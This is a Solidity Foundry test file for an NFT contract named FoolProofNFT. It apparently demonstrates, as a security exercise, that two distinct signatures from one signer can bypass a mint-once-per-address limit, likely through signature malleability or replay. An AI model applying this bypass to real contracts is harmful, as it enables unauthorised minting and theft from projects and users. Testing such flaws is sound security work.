// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../lib/forge-std/src/Test.sol";
import "../lib/forge-std/src/console.sol";
import "./FoolProofNFT.sol";

contract FoolProofNFTTest is Test {
    FoolProofNFT public nft;
    address signer = 0xF6A2dc49a58C3260e2AF963A44e36F8C4332a640;

    function setUp() public {
        nft = new FoolProofNFT();
    }

    function getHash() internal view returns (bytes32 hash) {
        hash = keccak256(abi.encodePacked(
            "\x19Ethereum Signed Message:\n20", signer));
    }

    function testLogHash() public view {
        console.logBytes32(getHash());
    }

    function testSignatureAttack() public {
        bytes memory sig1 = hex"0659dbb28cb9a26c45d9a5fd0105f873730a92d988afe9ab27c87b42b274685d714667f208b6ffc7e1184eeb3cc6cdd550a73225f60ffa877ae6fb32a1a62ff81b";
        bytes memory sig2 = hex"863fcb3a9f79fc61bc5984aac1fc5ed0d08398b690fa33e218f9dbe690344ac07c73560633b878145adab260f3aa1841bdb012461b28996606c9f2e06727dcce1c";
        nft.mintOnlyOncePerAddress(sig1, signer);
        nft.mintOnlyOncePerAddress(sig2, signer);

        assertEq(nft.balanceOf(signer), 2);
    }
}
